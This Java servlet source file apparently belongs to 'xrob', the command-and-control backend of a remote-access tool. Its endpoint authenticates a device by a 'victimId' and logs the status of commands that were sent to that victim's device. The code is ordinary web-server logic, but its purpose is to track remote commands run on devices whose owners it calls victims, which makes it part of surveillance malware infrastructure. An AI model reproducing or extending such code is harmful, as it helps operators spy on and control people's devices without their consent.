package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.command.CommandStatuses;
import com.theah64.xrob.api.database.tables.command.Commands;
import com.theah64.xrob.api.models.Command;
import com.theah64.xrob.api.utils.APIResponse;
import com.theah64.xrob.api.utils.HeaderSecurity;
import com.theah64.xrob.api.utils.Request;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * Created by theapache64 on 15/9/16,9:32 PM.
 */
@WebServlet(urlPatterns = BaseServlet.VERSION_CODE + "/command/status/add")
public class CommandStatusAddServlet extends BaseServlet {

    private static final String[] REQUIRED_PARAMS = {KEY_DATA};

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType(CONTENT_TYPE_JSON);

        final PrintWriter out = response.getWriter();
        try {
            final HeaderSecurity hs = new HeaderSecurity(request.getHeader(HeaderSecurity.KEY_AUTHORIZATION));
            final Request commandStatusAddRequest = new Request(request, REQUIRED_PARAMS);
            final String victimId = hs.getVictimId();

            final JSONArray jaCommandStatuses = new JSONArray(commandStatusAddRequest.getStringParameter(KEY_DATA));

            final CommandStatuses cStatuesTable = CommandStatuses.getInstance();

            for (int i = 0; i < jaCommandStatuses.length(); i++) {

                final JSONObject joCommandStatus = jaCommandStatuses.getJSONObject(i);

                final String commandId = joCommandStatus.getString(CommandStatuses.COLUMN_COMMAND_ID);
                //is command exist
                final boolean isCommandExistAndEstablishedForThisVictim = Commands.getInstance().isExist(Commands.COLUMN_ID, commandId, Commands.COLUMN_VICTIM_ID, victimId);

                if (isCommandExistAndEstablishedForThisVictim) {

                    final String status = joCommandStatus.getString(CommandStatuses.COLUMN_STATUS);

                    if (Command.Status.isValid(status)) {

                        final boolean isStatusAlreadyExists = cStatuesTable.isExist(CommandStatuses.COLUMN_COMMAND_ID, commandId, CommandStatuses.COLUMN_STATUS, status);

                        final boolean isStatusAdded = isStatusAlreadyExists || cStatuesTable.add(new Command.Status(
                                status,
                                joCommandStatus.getString(CommandStatuses.COLUMN_STATUS_MESSAGE),
                                0,
                                commandId
                        ));

                        if (!isStatusAdded) {
                            throw new IllegalArgumentException("Failed to add command status");
                        }

                    } else {
                        throw new IllegalArgumentException("Invalid status : " + status);
                    }


                } else {
                    throw new IllegalArgumentException("Command doesn't exist or not established for you");
                }
            }

            //Every thing's ok.
            out.write(new APIResponse("Status added", null).toString());


        } catch (Exception e) {
            e.printStackTrace();
            out.write(new APIResponse(e.getMessage()).toString());
        }


        out.flush();
        out.close();
    }

}
